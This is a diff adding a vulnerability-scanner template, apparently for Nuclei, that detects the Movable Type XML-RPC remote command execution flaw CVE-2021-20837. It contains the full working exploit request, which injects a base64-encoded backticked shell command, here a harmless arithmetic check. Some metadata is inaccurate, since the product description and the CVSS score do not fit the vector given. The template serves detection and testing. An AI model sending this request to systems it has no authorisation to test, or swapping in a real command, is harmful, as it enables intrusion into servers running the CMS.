@@ -1,0 +1,46 @@
+id: movabletype-rce-cve-2021-20837
+info:
+  name: MovableType RCE (CVE-2021-20837)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    MovableType is a safe, high-speed, serverless SaaS type comprehensive CMS system. Unauthorized command execution exists when the MovableType management system processes XMLRPC requests, allowing attackers to execute arbitrary commands.
+  reference:
+    - https://nemesis.sh/posts/movable-type-0day/
+    - https://movabletype.net
+  classification:
+    cve-id: CVE-2021-20837
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+  tags: rce,command-execution
+
+variables:
+  rand1: '{{rand_int(100000, 110000)}}'
+  rand2: '{{rand_int(85000, 95000)}}'
+  cmd_base64: '{{base64(concat("`expr ", rand1, " - ", rand2, "`"))}}'
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/mt/mt-xmlrpc.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0"?>
+        <methodCall>
+        <methodName>mt.handler_to_coderef</methodName>
+        <params>
+        <param><value><base64>
+        {{cmd_base64}}
+        </base64></value></param>
+        </params>
+        </methodCall>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{to_number(rand1) - to_number(rand2)}}'
